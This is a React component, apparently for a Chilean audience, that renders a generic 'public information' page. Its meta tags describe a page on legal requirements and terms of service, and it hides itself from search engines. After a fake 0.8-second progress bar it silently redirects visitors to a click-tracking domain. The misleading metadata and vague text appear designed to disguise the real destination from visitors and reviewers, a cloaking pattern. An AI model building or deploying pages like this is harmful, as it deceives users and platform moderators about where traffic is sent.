import React, { useEffect, useState } from 'react';
import { Loader } from './components/Loader';
import { Header } from './components/Header';
import { Footer } from './components/Footer';

export default function App() {
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    // Установка title
    document.title = 'Centro de información';
    
    // Установка мета-тегов
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noindex,nofollow';
    document.head.appendChild(metaRobots);

    const ogTitle = document.createElement('meta');
    ogTitle.setAttribute('property', 'og:title');
    ogTitle.content = 'Información pública y acceso autorizado';
    document.head.appendChild(ogTitle);

    const ogDescription = document.createElement('meta');
    ogDescription.setAttribute('property', 'og:description');
    ogDescription.content = 'Página informativa sobre requisitos legales y términos de servicio.';
    document.head.appendChild(ogDescription);

    const ogType = document.createElement('meta');
    ogType.setAttribute('property', 'og:type');
    ogType.content = 'website';
    document.head.appendChild(ogType);

    const ogLocale = document.createElement('meta');
    ogLocale.setAttribute('property', 'og:locale');
    ogLocale.content = 'es_CL';
    document.head.appendChild(ogLocale);
    // Симуляция прогресса загрузки (синхронизирован с редиректом на 0.8 сек)
    const progressInterval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(progressInterval);
          return 100;
        }
        return prev + 2.5;
      });
    }, 20);

    // Автоматический редирект через 0.8 секунды
    const redirectTimer = setTimeout(() => {
      window.location.href = "https://cl-go.click-track.online/";
    }, 800);

    return () => {
      clearInterval(progressInterval);
      clearTimeout(redirectTimer);
      // Очистка мета-тегов
      document.head.removeChild(metaRobots);
      document.head.removeChild(ogTitle);
      document.head.removeChild(ogDescription);
      document.head.removeChild(ogType);
      document.head.removeChild(ogLocale);
    };
  }, []);

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#F5F7FA' }}>
      <Header />
      
      <main className="flex-1 flex flex-col items-center justify-center px-4 sm:px-6 lg:px-8">
        <div className="max-w-2xl w-full text-center space-y-6 sm:space-y-8 -mt-16">
          {/* H1 - Заголовок */}
          <h1 
            className="text-2xl sm:text-3xl lg:text-4xl"
            style={{ color: '#111111' }}
          >
            Acceso a información general
          </h1>

          {/* H2 - Подзаголовок */}
          <div 
            className="text-base sm:text-lg"
            style={{ color: '#444444', lineHeight: '1.4' }}
          >
            <p>
              Esta sección ofrece datos públicos y generales del proyecto.
            </p>
            <p>
              Serás dirigido automáticamente al área correspondiente.
            </p>
          </div>

          {/* Прогресс-индикатор */}
          <div className="py-6 sm:py-8">
            <Loader progress={progress} />
          </div>

          {/* Body - Информационный блок */}
          <div 
            className="space-y-3 text-sm sm:text-base"
            style={{ color: '#444444' }}
          >
            <p className="leading-relaxed">
              Si estás viendo esta página, significa que el sistema está gestionando tu acceso.
            </p>
            <p className="leading-relaxed">
              En unos instantes serás trasladado a la sección correcta del proyecto A.
            </p>
          </div>
        </div>
      </main>

      {/* Микро-пояснение */}
      <div className="px-4 sm:px-6 lg:px-8 pb-4">
        <p 
          className="text-center text-xs sm:text-sm"
          style={{ color: '#777777' }}
        >
          Esta página forma parte del sistema de navegación interna del Proyecto A.
        </p>
      </div>

      <Footer />
    </div>
  );
}
